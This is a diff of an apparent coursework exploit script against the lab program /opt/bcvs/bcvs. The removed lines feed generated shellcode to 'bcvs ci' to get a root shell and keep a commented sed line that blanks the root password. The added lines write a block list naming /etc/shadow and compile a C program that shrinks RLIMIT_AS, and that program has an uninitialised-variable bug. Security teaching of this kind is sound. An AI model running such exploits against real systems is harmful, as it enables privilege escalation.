@@ -13,66 +13,72 @@
 # overflow in the copyFile function.
 ## ----------------------------------------------------- ##
 
-EXPLOIT_EXE="../exploit"
-SPLOIT_DIR="sploit8_dir"
-
 # Setup necessary environment
-gcc -o exploit exploit.c
+REPODIR=".bcvs"
+BLOCKLIST="block.list"
+BLOCKLISTPATH="${REPODIR}/${BLOCKLIST}"
 
-rm -rf $SPLIOT_DIR
-mkdir -p $SPLOIT_DIR
-cd $SPLOIT_DIR
+mkdir -p sploit1_dir
+cd sploit1_dir
 mkdir -p .bcvs
 touch .bcvs/block.list
 
-## Saving some stuff for later
-# Following will give the root user no password
-# cat /etc/passwd | sed 's/root:[^:]*:\(.*\)/root::\1/'
+#blocklist - Exact copy of the one in bcvs's directory
+echo $REPODIR > $BLOCKLISTPATH
+echo "/etc/" >> $BLOCKLISTPATH
+echo "/etc/shadow" >> $BLOCKLISTPATH
+echo "/sbin/" >> $BLOCKLISTPATH
 
-OFFSET=0
+cat <<EOS > "exploit.c"
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/time.h>
+#include <sys/resource.h>
 
-cat <<EOS > "run_w_gdb.sh"
-#!/bin/bash
-SC=\$($EXPLOIT_EXE $OFFSET)
-echo "Shellcode:"
-echo -n "\$SC" | hexdump -C
-gdb --args /opt/bcvs/bcvs ci "\$SC"
+#define START_LIMIT 10
+#define END_LIMIT_DELTA 2000
+
+typedef enum {false, true} bool;
+
+void checkStatus(int status, bool fatal) {
+  if (status < 0) {
+    perror("Error");
+    if (fatal) {
+      exit(status);
+    }
+  }
+}
+
+int main(int argc, char* argv[]) {
+  struct rlimit limit;
+  int as_limit_end, as_limit = START_LIMIT;
+  int status;
+
+  if (argc > 1) {
+    as_limit = atoi(argv[1]);
+  }
+
+  if (argc > 2) {
+    as_limit_end = as_limit + atoi(argv[2]);
+  } else {
+    int as_limit_end = as_limit + END_LIMIT_DELTA;
+  }
+
+  status = getrlimit(RLIMIT_AS, &limit);
+  checkStatus(status, true);
+  printf("RLIMIT_AS (soft: %d, hard: %d)\n", (int) limit.rlim_cur, (int) limit.rlim_max);
+
+  printf("Setting RLIMIT_AS to (%d, %d)\n", as_limit, as_limit);
+  limit.rlim_cur = as_limit;
+  limit.rlim_max = as_limit;
+
+  status = setrlimit(RLIMIT_AS, &limit);
+  checkStatus(status, true);
+  printf("RLIMIT_AS (soft: %d, hard: %d)\n", (int) limit.rlim_cur, (int) limit.rlim_max);
+
+  return 0;
+}
 EOS
+gcc -o exploit exploit.c
 
-cat <<EOS > "echo_shellcode.sh"
-#!/bin/bash
-SC=\$($EXPLOIT_EXE $OFFSET)
-echo "Shellcode:"
-echo -n "\$SC" | hexdump -C
-EOS
-
-cat <<EOS > "update_sploit.sh"
-cd ..
-./sploit8.sh -s
-cd $SPLOIT_DIR
-EOS
-
-chmod +x run_w_gdb.sh
-chmod +x update_sploit.sh
-
-if [[ $# -gt 0 && $1 == "-s" ]]; then
-  echo "Skipping sploit. Scripts updated"
-  exit 0
-fi
-
-
-SHELL_CODE=$($EXPLOIT_EXE)
-#echo "$SHELL_CODE"
-
-echo "Trying offset: $OFFSET"
-SHELL_CODE=$($EXPLOIT_EXE $OFFSET)
-if [[ $? -ne 0 ]]; then
-  echo "Failed to generate shellcode"
-  exit -1
-fi
-echo "Shellcode (hex): "
-echo -n "$SHELL_CODE" | hexdump -C
-/opt/bcvs/bcvs ci "${SHELL_CODE}"
-
-#/usr/bin/gdb /opt/bcvs/bcvs
-# And then hopefully you have a root shell at this point
+./exploit
